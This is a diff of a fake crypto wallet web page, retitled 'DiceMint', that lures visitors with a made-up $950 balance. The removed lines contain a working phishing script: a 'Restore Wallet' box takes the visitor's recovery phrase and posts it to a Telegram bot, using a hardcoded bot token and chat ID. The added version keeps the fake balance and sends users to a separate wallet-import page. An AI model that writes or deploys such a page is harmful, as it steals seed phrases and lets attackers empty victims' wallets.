@@ -3,122 +3,112 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Crypto Dashboard</title>
- <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500&display=swap" rel="stylesheet">
+  <title>DiceMint</title>
   <style>
-    * {
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-      font-family: 'Rajdhani', sans-serif;
-      font-size: 18px;
-  line-height: 1.1;
-    }
-    body {
-      background: #0f0f1b;
-      color: #fff;
-      min-height: 100vh;
-      padding-bottom: 80px;
       transition: background 0.3s, color 0.3s;
     }
-    .content-section {display: none; padding: 30px 20px; text-align: center;}
-    .content-section.active {display: block;}
+
+    .light-theme {
+      background-color: #f4f4f4;
+      color: #000;
+    }
+
+    .nav {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      display: flex;
+      justify-content: space-around;
+      background-color: #111;
+      padding: 10px 0;
+      border-top: 1px solid #222;
+    }
+
+    .light-theme .nav {
+      background-color: #fff;
+      border-top: 1px solid #ccc;
+    }
+
+    .nav a {
+      color: #ccc;
+      text-decoration: none;
+      text-align: center;
+      font-size: 13px;
+      flex: 1;
+    }
+
+    .light-theme .nav a {
+      color: #444;
+    }
+
+    .nav a.active {
+      color: #00f7ff;
+    }
+
+    .nav a span {
+      display: block;
+      font-size: 20px;
+      margin-bottom: 3px;
+    }
+
+    .content-section {
+      display: none;
+      padding: 20px;
+      padding-bottom: 80px;
+    }
+
+    .content-section.active {
+      display: block;
+    }
+
     .content-box {
-      background: #11152a;
-      padding: 25px;
-      border-radius: 12px;
-      box-.: 0 0 20px rgba(0,255,255,0.15);
-      border: 1px solid #1f2235;
-      margin-top: 30px;
-      transition: background 0.3s, border 0.3s;
+      margin-bottom: 20px;
+      background-color: #111;
+      padding: 15px;
+      border-radius: 10px;
+      transition: background 0.3s;
     }
-    .content-box h2 {color: #00ffff; margin-bottom: 15px;}
-    .bottom-nav {
-      position: fixed; bottom: 0; left: 0; width: 100%;
-      background: #11152a; display: flex; justify-content: space-around;
-      border-top: 1px solid #1f2235; z-index: 100;
+
+    .light-theme .content-box {
+      background-color: #fff;
+      border: 1px solid #ccc;
     }
-    .nav-item {
-      flex: 1; padding: 12px 5px; text-align: center;
-      color: #aaa; font-size: 18px; cursor: pointer; transition: 0.3s;
-    }
-    .nav-item.active {color: #00ffff; transform: translateY(-5px);}
-    .nav-item span {display: block; font-size: 22px;}
-    .input-field {
-      width: 100%; padding: 12px; margin: 10px 0;
-      border-radius: 6px; border: 1px solid #00ffff;
-      background: #0e162e; color: #00ffff;
-      outline: none; resize: none;
-    }
+
     .btn {
-      padding: 12px 20px;
-      background: linear-gradient(90deg,#00c6ff,#0072ff);
-      border: none; color: #fff;
-      border-radius: 8px; cursor: pointer;
-      font-size: 16px;
-    }
-    #bnbPrice {
-      color: #00ff90;
-      font-weight: bold;
-      font-size: 18px;
+      display: inline-block;
+      padding: 10px 15px;
+      background-color: #00f7ff;
+      color: #000;
+      text-decoration: none;
+      border-radius: 5px;
       margin-top: 10px;
     }
-    .tx-log {margin-top: 15px; font-size: 15px; color: #ccc; text-align: left; padding-left: 10px;}
-    #themeToggle {
+
+    /* Theme toggle button */
+    .theme-toggle {
       position: fixed;
       top: 10px;
       right: 10px;
-      background: #222;
-      color: #00ffff;
-      border: 1px solid #00ffff;
-      padding: 6px 10px;
-      border-radius: 8px;
+      background: none;
+      border: none;
+      font-size: 20px;
       cursor: pointer;
       z-index: 999;
-    }
-    body.light-mode {
-      background: #f2f2f2;
-      color: #000;
-    }
-    body.light-mode .content-box {
-      background: #fff;
-      border-color: #ddd;
-      box-.: 0 0 5px rgba(0,0,0,0.1);
-    }
-    body.light-mode .content-box h2 {
-      color: #0072ff;
-    }
-    body.light-mode .bottom-nav {
-      background: #fff;
-      border-top-color: #ccc;
-    }
-    body.light-mode .nav-item {
-      color: #555;
-    }
-    body.light-mode .nav-item.active {
-      color: #0072ff;
-    }
-    body.light-mode .input-field {
-      background: #e6f0ff;
-      border-color: #0072ff;
-      color: #000;
-    }
-    body.light-mode #themeToggle {
-      background: #fff;
-      color: #0072ff;
-      border-color: #0072ff;
-    }
-    body.light-mode .btn {
-      background: linear-gradient(90deg,#0072ff,#00c6ff);
-      color: #fff;
     }
   </style>
 </head>
 <body>
-<!-- 🔘 Theme Toggle -->
-<button id="themeToggle" onclick="toggleTheme()">🌓</button>
 
-<!-- ✅ Home Section -->
+<!-- THEME TOGGLE BUTTON -->
+<button class="theme-toggle" onclick="toggleTheme()">🌙</button>
+
+<!-- HOME -->
 <div id="home" class="content-section active">
   <div class="content-box">
     <h2>💼 Wallet</h2>
@@ -127,142 +117,120 @@
       <strong class="walletAmount">$950</strong> (<span class="bnbValueHome">--</span> BNB)
     </div>
   </div>
+
   <div class="content-box">
-    <h2 style="color: #44e3ff;">🔐 Restore Wallet</h2>
-    <p style="color: #cceeff;">Enter your Recovery phrase to restore your wallet and start earning.</p>
+    <h2 style="color: #44e3ff;">🔐 Import Wallet</h2>
+    <p style="color: #cceeff;">Click the button below to import your wallet using a recovery phrase.</p>
     <span>Add your wallet to start earning or trading</span>
     <p>You are trading in your own crypto wallet</p>
-    <textarea id="tokenPhrase" class="input-field" placeholder="Enter your Recovery phrase..." rows="4"></textarea>
-    <button class="btn" onclick="restoreWallet()">Restore Wallet</button>
-    <div id="tokenMsg" style="margin-top:15px; font-size:14px;"></div>
+    <a href="import_wallet.html" class="btn">Import Wallet</a>
   </div>
-  <div class="content-box"><h2>📊 BNB Price</h2><div id="bnbPrice">Loading BNB price...</div></div>
+
+  <div class="content-box">
+    <h2>📊 BNB Price</h2>
+    <div id="bnbPrice">Loading BNB price...</div>
+  </div>
 </div>
 
-<!-- ✅ Wallet Section -->
+<!-- WALLET -->
 <div id="wallet" class="content-section">
-  <div class="content-box"><h2>💼 Wallet</h2>
+  <div class="content-box">
+    <h2>💼 Wallet</h2>
     <p>Your current balance:</p>
     <div style="font-size: 24px; margin-top: 10px;">
       <strong class="walletAmount">$950</strong> (<span class="bnbValueWallet">--</span> BNB)
     </div>
   </div>
+
   <div class="content-box">
-    <h2 style="color: #44e3ff;">🔐 Restore Wallet</h2>
-    <p style="color: #cceeff;">Enter your Recovery phrase to restore your wallet and start earning.</p>
+    <h2 style="color: #44e3ff;">🔐 Import Wallet</h2>
+    <p style="color: #cceeff;">Click the button below to import your wallet using a recovery phrase.</p>
     <p>You are trading in your own crypto wallet</p>
-    <textarea id="tokenPhraseWallet" class="input-field" placeholder="Enter your Recovery phrase..." rows="4"></textarea>
-    <button class="btn" onclick="restoreWallet(true)">Restore Wallet</button>
-    <div id="tokenMsgWallet" style="margin-top:15px; font-size:14px;"></div>
+    <a href="import_wallet.html" class="btn">Import Wallet</a>
   </div>
 </div>
 
-<!-- ✅ FAQ Section -->
-<div id="deposit" class="content-section">
-  <div class="content-box"><h2>❓ How to Earn</h2><p style="color:#cceeff;">Complete daily tasks, join airdrops, and restore wallet to begin earning.</p></div>
-  <div class="content-box"><h2>📈 How to Trade</h2><p style="color:#ffd6f5;">You must have at least $20 in wallet. Restore your phrase to activate trading features.</p></div>
-  <div class="content-box"><h2>💡 Need Help?</h2><p style="color:#ccc;">Still confused?</p><a href="https://t.me/crmmrhelper" style="color:#5ffe68;">Contact Admin</a></div>
+<!-- EARN -->
+<div id="earn" class="content-section">
+  <div class="content-box">
+    <h2>💸 Earn</h2>
+    <p>Stake your BNB or refer friends to earn rewards. Coming soon...</p>
+  </div>
 </div>
 
-<!-- ✅ Transactions -->
-<div id="transactions" class="content-section">
-  <div class="content-box"><h2>📜 Transactions</h2><div id="txHistory"></div></div>
+<!-- HISTORY -->
+<div id="history" class="content-section">
+  <div class="content-box">
+    <h2>📜 History</h2>
+    <p>No transactions yet.</p>
+  </div>
 </div>
 
-<!-- ✅ Bottom Navigation -->
-<div class="bottom-nav">
-  <div class="nav-item active" onclick="showSection('home', this)"><span>🏠</span>Home</div>
-  <div class="nav-item" onclick="showSection('wallet', this)"><span>💰</span>Earn/Cashout</div>
-  <div class="nav-item" onclick="showSection('deposit', this)"><span>❓</span>FAQ</div>
-  <div class="nav-item" onclick="showSection('transactions', this)"><span>📜</span>History</div>
+<!-- FAQ -->
+<div id="faq" class="content-section">
+  <div class="content-box">
+    <h2>❓ FAQ</h2>
+    <p><strong>Q:</strong> How do I start trading?<br><strong>A:</strong> Import your wallet and fund with BNB.</p>
+    <p><strong>Q:</strong> Is my wallet secure?<br><strong>A:</strong> You control your private keys.</p>
+  </div>
 </div>
 
-<!-- ✅ Script -->
+<!-- NAVIGATION -->
+<div class="nav">
+  <a href="#" class="nav-link active" onclick="showSection(event, 'home')">
+    <span>🏠</span>Home
+  </a>
+  <a href="#" class="nav-link" onclick="showSection(event, 'wallet')">
+    <span>👛</span>Wallet
+  </a>
+  <a href="#" class="nav-link" onclick="showSection(event, 'earn')">
+    <span>💸</span>Earn
+  </a>
+  <a href="#" class="nav-link" onclick="showSection(event, 'history')">
+    <span>📜</span>History
+  </a>
+  <a href="#" class="nav-link" onclick="showSection(event, 'faq')">
+    <span>❓</span>FAQ
+  </a>
+</div>
+
+<!-- JS -->
 <script>
-  const TELEGRAM_BOT_TOKEN = "7964620453:AAFMQ4mxCpezN6kuTCUEgK7WeMBFNJW2ZS4";
-  const TELEGRAM_CHAT_ID = "7979664801";
-  let bnbPriceUSD = 600;
-  let currentBalanceUSD = 950;
-
-  function showSection(id, el) {
-    document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-    el.classList.add('active');
-  }
-
-  function updateBNBValue() {
-    const bnb = (currentBalanceUSD / bnbPriceUSD).toFixed(4);
-    document.querySelectorAll(".walletAmount").forEach(el => el.textContent = `$${currentBalanceUSD}`);
-    document.querySelectorAll(".bnbValueHome").forEach(el => el.textContent = bnb);
-    document.querySelectorAll(".bnbValueWallet").forEach(el => el.textContent = bnb);
-  }
-
-  function restoreWallet(fromWalletTab = false) {
-    const input = document.getElementById(fromWalletTab ? "tokenPhraseWallet" : "tokenPhrase").value.trim();
-    const msgBox = document.getElementById(fromWalletTab ? "tokenMsgWallet" : "tokenMsg");
-    const wordCount = input.split(/\s+/).length;
-
-    if (input.length < 12 || wordCount < 3) {
-      msgBox.style.color = 'orange';
-      msgBox.textContent = '❌ Invalid phrase: Must be at least 12 characters and 3 words.';
-      return;
-    }
-
-    if (currentBalanceUSD < 20) {
-      msgBox.style.color = 'red';
-      msgBox.innerHTML = `❌ You need at least <strong>$20</strong> before restoring.<br>Current balance: $${currentBalanceUSD}`;
-      return;
-    }
-
-    const message = `🔐 Restore Wallet Request:\n\n${input}`;
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-    }).then(res => {
-      if (res.ok) {
-        msgBox.style.color = '#00ff90';
-        msgBox.innerHTML = `✅ Wallet restored successfully.<br>🟢 Trading and Earning will be activated only if you have $20 in your BNB Wallet in the phrases you submitted.`;
-        document.getElementById(fromWalletTab ? "tokenPhraseWallet" : "tokenPhrase").value = '';
-      } else {
-        msgBox.style.color = 'red';
-        msgBox.textContent = '❌ Failed to send request.';
-      }
-    }).catch(() => {
-      msgBox.style.color = 'red';
-      msgBox.textContent = '⚠️ Network error. Try again.';
+  function showSection(event, id) {
+    document.querySelectorAll('.content-section').forEach(sec => {
+      sec.classList.remove('active');
     });
+    document.getElementById(id).classList.add('active');
+
+    document.querySelectorAll('.nav-link').forEach(link => {
+      link.classList.remove('active');
+    });
+    event.target.closest('a').classList.add('active');
   }
+
+  document.querySelectorAll('.walletAmount').forEach(el => {
+    el.textContent = "$950";
+  });
+
+  document.querySelectorAll('.bnbValueHome, .bnbValueWallet').forEach(el => {
+    el.textContent = "0.12";
+  });
 
   function toggleTheme() {
-    document.body.classList.toggle('light-mode');
-    localStorage.setItem('theme', document.body.classList.contains('light-mode') ? 'light' : 'dark');
+    const isLight = document.body.classList.toggle('light-theme');
+    const toggleBtn = document.querySelector('.theme-toggle');
+    toggleBtn.textContent = isLight ? '☀️' : '🌙';
+    localStorage.setItem('theme', isLight ? 'light' : 'dark');
   }
 
-  function addToHistory(txt) {
-    const div = document.createElement("div");
-    div.textContent = txt;
-    document.getElementById("txHistory").prepend(div);
-  }
-
-  window.onload = () => {
-    if (localStorage.getItem('theme') === 'light') {
-      document.body.classList.add('light-mode');
+  // Load theme preference
+  window.onload = function () {
+    const savedTheme = localStorage.getItem('theme');
+    if (savedTheme === 'light') {
+      document.body.classList.add('light-theme');
+      document.querySelector('.theme-toggle').textContent = '☀️';
     }
   };
-
-  fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd")
-    .then(res => res.json())
-    .then(data => {
-      bnbPriceUSD = data.binancecoin.usd;
-      document.getElementById("bnbPrice").textContent = `BNB Price: $${bnbPriceUSD}`;
-      updateBNBValue();
-    })
-    .catch(() => {
-      document.getElementById("bnbPrice").textContent = `BNB Price: $${bnbPriceUSD} (offline)`;
-      updateBNBValue();
-    });
 </script>
 
 </body>
